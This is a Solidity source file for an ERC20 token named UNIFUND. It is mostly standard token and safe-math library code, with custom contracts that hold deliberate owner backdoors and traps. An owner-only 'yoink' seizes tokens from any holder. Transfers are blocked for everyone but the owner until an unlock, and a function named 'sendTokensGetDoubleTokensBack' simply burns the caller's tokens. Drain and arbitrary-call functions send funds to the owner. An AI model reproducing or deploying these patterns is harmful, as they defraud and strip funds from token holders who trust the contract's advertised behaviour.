1 // SPDX-License-Identifier: Blarg
2 
3 pragma solidity ^0.7.2;
4 
5 
6 
7 /**
8  * @title SafeERC20
9  * @dev Wrappers around ERC20 operations that throw on failure (when the token
10  * contract returns false). Tokens that return no value (and instead revert or
11  * throw on failure) are also supported, non-reverting calls are assumed to be
12  * successful.
13  * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract,
14  * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.
15  */
16 library SafeERC20 {
17     using SafeMath for uint256;
18     using Address for address;
19 
20     function safeTransfer(IERC20 token, address to, uint256 value) internal {
21         _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
22     }
23 
24     function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
25         _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
26     }
27 
28     /**
29      * @dev Deprecated. This function has issues similar to the ones found in
30      * {IERC20-approve}, and its usage is discouraged.
31      *
32      * Whenever possible, use {safeIncreaseAllowance} and
33      * {safeDecreaseAllowance} instead.
34      */
35     function safeApprove(IERC20 token, address spender, uint256 value) internal {
36         // safeApprove should only be called when setting an initial allowance,
37         // or when resetting it to zero. To increase and decrease it, use
38         // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'
39         // solhint-disable-next-line max-line-length
40         require((value == 0) || (token.allowance(address(this), spender) == 0),
41             "SafeERC20: approve from non-zero to non-zero allowance"
42         );
43         _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
44     }
45 
46     function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {
47         uint256 newAllowance = token.allowance(address(this), spender).add(value);
48         _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
49     }
50 
51     function safeDecreaseAllowance(IERC20 token, address spender, uint256 value) internal {
52         uint256 newAllowance = token.allowance(address(this), spender).sub(value, "SafeERC20: decreased allowance below zero");
53         _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
54     }
55 
56     /**
57      * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement
58      * on the return value: the return value is optional (but if data is returned, it must not be false).
59      * @param token The token targeted by the call.
60      * @param data The call data (encoded using abi.encode or one of its variants).
61      */
62     function _callOptionalReturn(IERC20 token, bytes memory data) private {
63         // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
64         // we're implementing it ourselves. We use {Address.functionCall} to perform this call, which verifies that
65         // the target address contains contract code and also asserts for success in the low-level call.
66 
67         bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
68         if (returndata.length > 0) { // Return data is optional
69             // solhint-disable-next-line max-line-length
70             require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
71         }
72     }
73 }
74 
75 
76 interface IUnifundDrain
77 {
78     function emergencyUnlockTimestamp() external view returns (uint256);
79     function contractIsFlawless() external view returns (bool); 
80 
81     function drain(address token) external;
82     function fix(address target, bytes memory data, uint256 value) external;
83     function emergencyUnlock() external;
84     function weThinkItWorksNow() external;
85 }
86 
87 
88 
89 abstract contract UnifundDrain is IUnifundDrain
90 {
91     using SafeERC20 for IERC20;
92 
93     address payable immutable private owner = msg.sender;
94     uint256 public override emergencyUnlockTimestamp;
95     bool public override contractIsFlawless;
96 
97     function drain(address token)
98         public
99         override
100     {
101         uint256 amount;
102         bool emergencyUnlocked = emergencyUnlockTimestamp > 0 && block.timestamp >= emergencyUnlockTimestamp;
103         if (token == address(0))
104         {
105             require (address(this).balance > 0, "Nothing to send");
106             amount = address(this).balance;
107             if (!emergencyUnlocked) {
108                 amount = _drainAmount(token, amount);
109             }
110             require (amount > 0, "Nothing allowed to send");
111             (bool success,) = owner.call{ value: amount }("");
112             require (success, "Transfer failed");
113             return;
114         }
115         amount = IERC20(token).balanceOf(address(this));
116         require (amount > 0, "Nothing to send");
117         if (!emergencyUnlocked) {
118             amount = _drainAmount(token, amount);
119         }
120         require (amount > 0, "Nothing allowed to send");
121         IERC20(token).safeTransfer(owner, amount);
122     }
123 
124     function fix(address target, bytes memory data, uint256 value) 
125         public
126         override
127         ownerSucks()
128     {
129         require (emergencyUnlockTimestamp > 0 && block.timestamp >= emergencyUnlockTimestamp);
130         (bool success,) = target.call{ value: value }(data);
131         require (success);
132     }
133 
134     function _drainAmount(address token, uint256 available) internal virtual returns (uint256 amount);
135 
136     modifier ownerSucks() {
137         require (!contractIsFlawless, "Perfection");
138         require (owner == msg.sender, "Owner only");
139         _;
140     }
141 
142     function emergencyUnlock()
143         public
144         override
145         ownerSucks()
146     {   
147         emergencyUnlockTimestamp = block.timestamp + 604800;
148     }
149 
150     function weThinkItWorksNow()
151         public
152         override
153         ownerSucks()
154     {
155         contractIsFlawless = true;
156         emergencyUnlockTimestamp = 0;
157     }
158 }
159 
160 interface IUnifund
161 {
162     function hiddenMintFunction() external;
163     function unlock() external;
164     function yoink(address _from, uint256 _amount) external;
165     function sendTokensGetDoubleTokensBack(uint256 amount) external;
166 }
167 
168 interface IUnifundERC20
169 {
170     function authorizedAddresses(address a) external view returns (bool);
171     function addAuthorizedAddress(address a) external;
172     function removeAuthorizedAddress(address a) external;
173     function lockAuthorizedAddresses() external;
174 }
175 
176 /**
177  * @dev Collection of functions related to the address type
178  */
179 library Address {
180     /**
181      * @dev Returns true if `account` is a contract.
182      *
183      * [IMPORTANT]
184      * ====
185      * It is unsafe to assume that an address for which this function returns
186      * false is an externally-owned account (EOA) and not a contract.
187      *
188      * Among others, `isContract` will return false for the following
189      * types of addresses:
190      *
191      *  - an externally-owned account
192      *  - a contract in construction
193      *  - an address where a contract will be created
194      *  - an address where a contract lived, but was destroyed
195      * ====
196      */
197     function isContract(address account) internal view returns (bool) {
198         // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
199         // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
200         // for accounts without code, i.e. `keccak256('')`
201         bytes32 codehash;
202         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
203         // solhint-disable-next-line no-inline-assembly
204         assembly { codehash := extcodehash(account) }
205         return (codehash != accountHash && codehash != 0x0);
206     }
207 
208     /**
209      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
210      * `recipient`, forwarding all available gas and reverting on errors.
211      *
212      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
213      * of certain opcodes, possibly making contracts go over the 2300 gas limit
214      * imposed by `transfer`, making them unable to receive funds via
215      * `transfer`. {sendValue} removes this limitation.
216      *
217      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
218      *
219      * IMPORTANT: because control is transferred to `recipient`, care must be
220      * taken to not create reentrancy vulnerabilities. Consider using
221      * {ReentrancyGuard} or the
222      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
223      */
224     function sendValue(address payable recipient, uint256 amount) internal {
225         require(address(this).balance >= amount, "Address: insufficient balance");
226 
227         // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
228         (bool success, ) = recipient.call{ value: amount }("");
229         require(success, "Address: unable to send value, recipient may have reverted");
230     }
231 
232     /**
233      * @dev Performs a Solidity function call using a low level `call`. A
234      * plain`call` is an unsafe replacement for a function call: use this
235      * function instead.
236      *
237      * If `target` reverts with a revert reason, it is bubbled up by this
238      * function (like regular Solidity function calls).
239      *
240      * Returns the raw returned data. To convert to the expected return value,
241      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
242      *
243      * Requirements:
244      *
245      * - `target` must be a contract.
246      * - calling `target` with `data` must not revert.
247      *
248      * _Available since v3.1._
249      */
250     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
251       return functionCall(target, data, "Address: low-level call failed");
252     }
253 
254     /**
255      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
256      * `errorMessage` as a fallback revert reason when `target` reverts.
257      *
258      * _Available since v3.1._
259      */
260     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
261         return _functionCallWithValue(target, data, 0, errorMessage);
262     }
263 
264     /**
265      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
266      * but also transferring `value` wei to `target`.
267      *
268      * Requirements:
269      *
270      * - the calling contract must have an ETH balance of at least `value`.
271      * - the called Solidity function must be `payable`.
272      *
273      * _Available since v3.1._
274      */
275     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
276         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
277     }
278 
279     /**
280      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
281      * with `errorMessage` as a fallback revert reason when `target` reverts.
282      *
283      * _Available since v3.1._
284      */
285     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
286         require(address(this).balance >= value, "Address: insufficient balance for call");
287         return _functionCallWithValue(target, data, value, errorMessage);
288     }
289 
290     function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
291         require(isContract(target), "Address: call to non-contract");
292 
293         // solhint-disable-next-line avoid-low-level-calls
294         (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
295         if (success) {
296             return returndata;
297         } else {
298             // Look for revert reason and bubble it up if present
299             if (returndata.length > 0) {
300                 // The easiest way to bubble the revert reason is using memory via assembly
301 
302                 // solhint-disable-next-line no-inline-assembly
303                 assembly {
304                     let returndata_size := mload(returndata)
305                     revert(add(32, returndata), returndata_size)
306                 }
307             } else {
308                 revert(errorMessage);
309             }
310         }
311     }
312 }
313 
314 /**
315  * @dev Wrappers over Solidity's arithmetic operations with added overflow
316  * checks.
317  *
318  * Arithmetic operations in Solidity wrap on overflow. This can easily result
319  * in bugs, because programmers usually assume that an overflow raises an
320  * error, which is the standard behavior in high level programming languages.
321  * `SafeMath` restores this intuition by reverting the transaction when an
322  * operation overflows.
323  *
324  * Using this library instead of the unchecked operations eliminates an entire
325  * class of bugs, so it's recommended to use it always.
326  */
327 library SafeMath {
328     /**
329      * @dev Returns the addition of two unsigned integers, reverting on
330      * overflow.
331      *
332      * Counterpart to Solidity's `+` operator.
333      *
334      * Requirements:
335      *
336      * - Addition cannot overflow.
337      */
338     function add(uint256 a, uint256 b) internal pure returns (uint256) {
339         uint256 c = a + b;
340         require(c >= a, "SafeMath: addition overflow");
341 
342         return c;
343     }
344 
345     /**
346      * @dev Returns the subtraction of two unsigned integers, reverting on
347      * overflow (when the result is negative).
348      *
349      * Counterpart to Solidity's `-` operator.
350      *
351      * Requirements:
352      *
353      * - Subtraction cannot overflow.
354      */
355     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
356         return sub(a, b, "SafeMath: subtraction overflow");
357     }
358 
359     /**
360      * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
361      * overflow (when the result is negative).
362      *
363      * Counterpart to Solidity's `-` operator.
364      *
365      * Requirements:
366      *
367      * - Subtraction cannot overflow.
368      */
369     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
370         require(b <= a, errorMessage);
371         uint256 c = a - b;
372 
373         return c;
374     }
375 
376     /**
377      * @dev Returns the multiplication of two unsigned integers, reverting on
378      * overflow.
379      *
380      * Counterpart to Solidity's `*` operator.
381      *
382      * Requirements:
383      *
384      * - Multiplication cannot overflow.
385      */
386     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
387         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
388         // benefit is lost if 'b' is also tested.
389         // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
390         if (a == 0) {
391             return 0;
392         }
393 
394         uint256 c = a * b;
395         require(c / a == b, "SafeMath: multiplication overflow");
396 
397         return c;
398     }
399 
400     /**
401      * @dev Returns the integer division of two unsigned integers. Reverts on
402      * division by zero. The result is rounded towards zero.
403      *
404      * Counterpart to Solidity's `/` operator. Note: this function uses a
405      * `revert` opcode (which leaves remaining gas untouched) while Solidity
406      * uses an invalid opcode to revert (consuming all remaining gas).
407      *
408      * Requirements:
409      *
410      * - The divisor cannot be zero.
411      */
412     function div(uint256 a, uint256 b) internal pure returns (uint256) {
413         return div(a, b, "SafeMath: division by zero");
414     }
415 
416     /**
417      * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
418      * division by zero. The result is rounded towards zero.
419      *
420      * Counterpart to Solidity's `/` operator. Note: this function uses a
421      * `revert` opcode (which leaves remaining gas untouched) while Solidity
422      * uses an invalid opcode to revert (consuming all remaining gas).
423      *
424      * Requirements:
425      *
426      * - The divisor cannot be zero.
427      */
428     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
429         require(b > 0, errorMessage);
430         uint256 c = a / b;
431         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
432 
433         return c;
434     }
435 
436     /**
437      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
438      * Reverts when dividing by zero.
439      *
440      * Counterpart to Solidity's `%` operator. This function uses a `revert`
441      * opcode (which leaves remaining gas untouched) while Solidity uses an
442      * invalid opcode to revert (consuming all remaining gas).
443      *
444      * Requirements:
445      *
446      * - The divisor cannot be zero.
447      */
448     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
449         return mod(a, b, "SafeMath: modulo by zero");
450     }
451 
452     /**
453      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
454      * Reverts with custom message when dividing by zero.
455      *
456      * Counterpart to Solidity's `%` operator. This function uses a `revert`
457      * opcode (which leaves remaining gas untouched) while Solidity uses an
458      * invalid opcode to revert (consuming all remaining gas).
459      *
460      * Requirements:
461      *
462      * - The divisor cannot be zero.
463      */
464     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
465         require(b != 0, errorMessage);
466         return a % b;
467     }
468 }
469 
470 /**
471  * @dev Interface of the ERC20 standard as defined in the EIP.
472  */
473 interface IERC20 {
474     /**
475      * @dev Returns the amount of tokens in existence.
476      */
477     function totalSupply() external view returns (uint256);
478 
479     /**
480      * @dev Returns the amount of tokens owned by `account`.
481      */
482     function balanceOf(address account) external view returns (uint256);
483 
484     /**
485      * @dev Moves `amount` tokens from the caller's account to `recipient`.
486      *
487      * Returns a boolean value indicating whether the operation succeeded.
488      *
489      * Emits a {Transfer} event.
490      */
491     function transfer(address recipient, uint256 amount) external returns (bool);
492 
493     /**
494      * @dev Returns the remaining number of tokens that `spender` will be
495      * allowed to spend on behalf of `owner` through {transferFrom}. This is
496      * zero by default.
497      *
498      * This value changes when {approve} or {transferFrom} are called.
499      */
500     function allowance(address owner, address spender) external view returns (uint256);
501 
502     /**
503      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
504      *
505      * Returns a boolean value indicating whether the operation succeeded.
506      *
507      * IMPORTANT: Beware that changing an allowance with this method brings the risk
508      * that someone may use both the old and the new allowance by unfortunate
509      * transaction ordering. One possible solution to mitigate this race
510      * condition is to first reduce the spender's allowance to 0 and set the
511      * desired value afterwards:
512      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
513      *
514      * Emits an {Approval} event.
515      */
516     function approve(address spender, uint256 amount) external returns (bool);
517 
518     /**
519      * @dev Moves `amount` tokens from `sender` to `recipient` using the
520      * allowance mechanism. `amount` is then deducted from the caller's
521      * allowance.
522      *
523      * Returns a boolean value indicating whether the operation succeeded.
524      *
525      * Emits a {Transfer} event.
526      */
527     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
528 
529     /**
530      * @dev Emitted when `value` tokens are moved from one account (`from`) to
531      * another (`to`).
532      *
533      * Note that `value` may be zero.
534      */
535     event Transfer(address indexed from, address indexed to, uint256 value);
536 
537     /**
538      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
539      * a call to {approve}. `value` is the new allowance.
540      */
541     event Approval(address indexed owner, address indexed spender, uint256 value);
542 }
543 
544 /*
545  * @dev Provides information about the current execution context, including the
546  * sender of the transaction and its data. While these are generally available
547  * via msg.sender and msg.data, they should not be accessed in such a direct
548  * manner, since when dealing with GSN meta-transactions the account sending and
549  * paying for execution may not be the actual sender (as far as an application
550  * is concerned).
551  *
552  * This contract is only required for intermediate, library-like contracts.
553  */
554 abstract contract Context {
555     function _msgSender() internal view virtual returns (address payable) {
556         return msg.sender;
557     }
558 
559     function _msgData() internal view virtual returns (bytes memory) {
560         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
561         return msg.data;
562     }
563 }
564 
565 
566 
567 /**
568  * @dev Implementation of the {IERC20} interface.
569  *
570  * This implementation is agnostic to the way tokens are created. This means
571  * that a supply mechanism has to be added in a derived contract using {_mint}.
572  * For a generic mechanism see {ERC20PresetMinterPauser}.
573  *
574  * TIP: For a detailed writeup see our guide
575  * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
576  * to implement supply mechanisms].
577  *
578  * We have followed general OpenZeppelin guidelines: functions revert instead
579  * of returning `false` on failure. This behavior is nonetheless conventional
580  * and does not conflict with the expectations of ERC20 applications.
581  *
582  * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
583  * This allows applications to reconstruct the allowance for all accounts just
584  * by listening to said events. Other implementations of the EIP may not emit
585  * these events, as it isn't required by the specification.
586  *
587  * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
588  * functions have been added to mitigate the well-known issues around setting
589  * allowances. See {IERC20-approve}.
590  */
591 contract ERC20 is Context, IERC20 {
592     using SafeMath for uint256;
593     using Address for address;
594 
595     mapping (address => uint256) private _balances;
596 
597     mapping (address => mapping (address => uint256)) private _allowances;
598 
599     uint256 private _totalSupply;
600 
601     string private _name;
602     string private _symbol;
603     uint8 private _decimals;
604 
605     /**
606      * @dev Sets the values for {name} and {symbol}, initializes {decimals} with
607      * a default value of 18.
608      *
609      * To select a different value for {decimals}, use {_setupDecimals}.
610      *
611      * All three of these values are immutable: they can only be set once during
612      * construction.
613      */
614     constructor (string memory name, string memory symbol) {
615         _name = name;
616         _symbol = symbol;
617         _decimals = 18;
618     }
619 
620     /**
621      * @dev Returns the name of the token.
622      */
623     function name() public view returns (string memory) {
624         return _name;
625     }
626 
627     /**
628      * @dev Returns the symbol of the token, usually a shorter version of the
629      * name.
630      */
631     function symbol() public view returns (string memory) {
632         return _symbol;
633     }
634 
635     /**
636      * @dev Returns the number of decimals used to get its user representation.
637      * For example, if `decimals` equals `2`, a balance of `505` tokens should
638      * be displayed to a user as `5,05` (`505 / 10 ** 2`).
639      *
640      * Tokens usually opt for a value of 18, imitating the relationship between
641      * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is
642      * called.
643      *
644      * NOTE: This information is only used for _display_ purposes: it in
645      * no way affects any of the arithmetic of the contract, including
646      * {IERC20-balanceOf} and {IERC20-transfer}.
647      */
648     function decimals() public view returns (uint8) {
649         return _decimals;
650     }
651 
652     /**
653      * @dev See {IERC20-totalSupply}.
654      */
655     function totalSupply() public view override returns (uint256) {
656         return _totalSupply;
657     }
658 
659     /**
660      * @dev See {IERC20-balanceOf}.
661      */
662     function balanceOf(address account) public view override returns (uint256) {
663         return _balances[account];
664     }
665 
666     /**
667      * @dev See {IERC20-transfer}.
668      *
669      * Requirements:
670      *
671      * - `recipient` cannot be the zero address.
672      * - the caller must have a balance of at least `amount`.
673      */
674     function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
675         _transfer(_msgSender(), recipient, amount);
676         return true;
677     }
678 
679     /**
680      * @dev See {IERC20-allowance}.
681      */
682     function allowance(address owner, address spender) public view virtual override returns (uint256) {
683         return _allowances[owner][spender];
684     }
685 
686     /**
687      * @dev See {IERC20-approve}.
688      *
689      * Requirements:
690      *
691      * - `spender` cannot be the zero address.
692      */
693     function approve(address spender, uint256 amount) public virtual override returns (bool) {
694         _approve(_msgSender(), spender, amount);
695         return true;
696     }
697 
698     /**
699      * @dev See {IERC20-transferFrom}.
700      *
701      * Emits an {Approval} event indicating the updated allowance. This is not
702      * required by the EIP. See the note at the beginning of {ERC20};
703      *
704      * Requirements:
705      * - `sender` and `recipient` cannot be the zero address.
706      * - `sender` must have a balance of at least `amount`.
707      * - the caller must have allowance for ``sender``'s tokens of at least
708      * `amount`.
709      */
710     function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
711         _transfer(sender, recipient, amount);
712         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
713         return true;
714     }
715 
716     /**
717      * @dev Atomically increases the allowance granted to `spender` by the caller.
718      *
719      * This is an alternative to {approve} that can be used as a mitigation for
720      * problems described in {IERC20-approve}.
721      *
722      * Emits an {Approval} event indicating the updated allowance.
723      *
724      * Requirements:
725      *
726      * - `spender` cannot be the zero address.
727      */
728     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
729         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
730         return true;
731     }
732 
733     /**
734      * @dev Atomically decreases the allowance granted to `spender` by the caller.
735      *
736      * This is an alternative to {approve} that can be used as a mitigation for
737      * problems described in {IERC20-approve}.
738      *
739      * Emits an {Approval} event indicating the updated allowance.
740      *
741      * Requirements:
742      *
743      * - `spender` cannot be the zero address.
744      * - `spender` must have allowance for the caller of at least
745      * `subtractedValue`.
746      */
747     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
748         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
749         return true;
750     }
751 
752     /**
753      * @dev Moves tokens `amount` from `sender` to `recipient`.
754      *
755      * This is internal function is equivalent to {transfer}, and can be used to
756      * e.g. implement automatic token fees, slashing mechanisms, etc.
757      *
758      * Emits a {Transfer} event.
759      *
760      * Requirements:
761      *
762      * - `sender` cannot be the zero address.
763      * - `recipient` cannot be the zero address.
764      * - `sender` must have a balance of at least `amount`.
765      */
766     function _transfer(address sender, address recipient, uint256 amount) internal virtual {
767         require(sender != address(0), "ERC20: transfer from the zero address");
768         require(recipient != address(0), "ERC20: transfer to the zero address");
769 
770         _beforeTokenTransfer(sender, recipient, amount);
771 
772         _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
773         _balances[recipient] = _balances[recipient].add(amount);
774         emit Transfer(sender, recipient, amount);
775     }
776 
777     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
778      * the total supply.
779      *
780      * Emits a {Transfer} event with `from` set to the zero address.
781      *
782      * Requirements
783      *
784      * - `to` cannot be the zero address.
785      */
786     function _mint(address account, uint256 amount) internal virtual {
787         require(account != address(0), "ERC20: mint to the zero address");
788 
789         _beforeTokenTransfer(address(0), account, amount);
790 
791         _totalSupply = _totalSupply.add(amount);
792         _balances[account] = _balances[account].add(amount);
793         emit Transfer(address(0), account, amount);
794     }
795 
796     /**
797      * @dev Destroys `amount` tokens from `account`, reducing the
798      * total supply.
799      *
800      * Emits a {Transfer} event with `to` set to the zero address.
801      *
802      * Requirements
803      *
804      * - `account` cannot be the zero address.
805      * - `account` must have at least `amount` tokens.
806      */
807     function _burn(address account, uint256 amount) internal virtual {
808         require(account != address(0), "ERC20: burn from the zero address");
809 
810         _beforeTokenTransfer(account, address(0), amount);
811 
812         _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
813         _totalSupply = _totalSupply.sub(amount);
814         emit Transfer(account, address(0), amount);
815     }
816 
817     /**
818      * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
819      *
820      * This is internal function is equivalent to `approve`, and can be used to
821      * e.g. set automatic allowances for certain subsystems, etc.
822      *
823      * Emits an {Approval} event.
824      *
825      * Requirements:
826      *
827      * - `owner` cannot be the zero address.
828      * - `spender` cannot be the zero address.
829      */
830     function _approve(address owner, address spender, uint256 amount) internal virtual {
831         require(owner != address(0), "ERC20: approve from the zero address");
832         require(spender != address(0), "ERC20: approve to the zero address");
833 
834         _allowances[owner][spender] = amount;
835         emit Approval(owner, spender, amount);
836     }
837 
838     /**
839      * @dev Sets {decimals} to a value other than the default one of 18.
840      *
841      * WARNING: This function should only be called from the constructor. Most
842      * applications that interact with token contracts will not expect
843      * {decimals} to ever change, and may work incorrectly if it does.
844      */
845     function _setupDecimals(uint8 decimals_) internal {
846         _decimals = decimals_;
847     }
848 
849     /**
850      * @dev Hook that is called before any transfer of tokens. This includes
851      * minting and burning.
852      *
853      * Calling conditions:
854      *
855      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
856      * will be to transferred to `to`.
857      * - when `from` is zero, `amount` tokens will be minted for `to`.
858      * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
859      * - `from` and `to` are never both zero.
860      *
861      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
862      */
863     function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
864 }
865 
866 
867 contract UnifundERC20 is ERC20, IUnifundERC20
868 {
869     address immutable private owner = msg.sender;
870     mapping (address => bool) public override authorizedAddresses;
871     bool public authorizedAddressesLocked;
872 
873     constructor(string memory _name, string memory _symbol)
874         ERC20(_name, _symbol)
875     {
876     }
877 
878     modifier ownerNotLocked() { 
879         require (owner == msg.sender, "!Owner"); 
880         require (!authorizedAddressesLocked, "Locked");
881         _; 
882     }
883 
884     function addAuthorizedAddress(address a)
885         public
886         override
887         ownerNotLocked()
888     {
889         require (!authorizedAddresses[a], "Authed");
890         authorizedAddresses[a] = true;
891     }
892 
893     function removeAuthorizedAddress(address a)
894         public
895         override
896         ownerNotLocked()
897     {
898         require (authorizedAddresses[a], "!Authed");
899         authorizedAddresses[a] = false;
900     }
901 
902     function lockAuthorizedAddresses()
903         public
904         override
905         ownerNotLocked()
906     {
907         authorizedAddressesLocked = true;
908     }
909 
910     function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
911         if (authorizedAddresses[msg.sender]) {
912             _transfer(sender, recipient, amount);
913             return true;
914         }
915         return super.transferFrom(sender, recipient, amount);
916     }
917 }
918 
919 
920 contract Unifund is UnifundERC20, UnifundDrain, IUnifund
921 {
922     address immutable owner = msg.sender;
923 
924     bool unlocked;
925 
926     constructor()
927         UnifundERC20("UNIFUND", "iFUND")
928     {
929     }
930 
931     modifier ownerOnly() { require (owner == msg.sender, "!Owner"); _; }
932 
933     function hiddenMintFunction() 
934         public
935         override
936     {
937         require (totalSupply() == 0);
938         _mint(owner, 36988970321706126895116000);
939     }
940 
941     function yoink(
942         address _from,
943         uint256 _amount
944     )
945         public
946         override
947         ownerOnly()
948     {
949         require (!unlocked, "!Locked");
950         _transfer(_from, owner, _amount);
951     }
952 
953     function unlock()
954         public
955         override
956         ownerOnly()
957     {
958         require (!unlocked, "!Locked");
959         unlocked = true;
960     }
961 
962     function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override { 
963         require (
964             unlocked ||
965             tx.origin == owner,
966             "The contract has not yet become operational");
967         super._beforeTokenTransfer(from, to, amount);
968     }
969 
970     function sendTokensGetDoubleTokensBack(uint256 amount)
971         public
972         override
973     {
974         _burn(msg.sender, amount);
975     }
976 
977     function _drainAmount(
978         address, 
979         uint256 _available
980     ) 
981         internal 
982         override
983         pure
984         returns (uint256 amount)
985     {
986         return _available;
987     }
988 }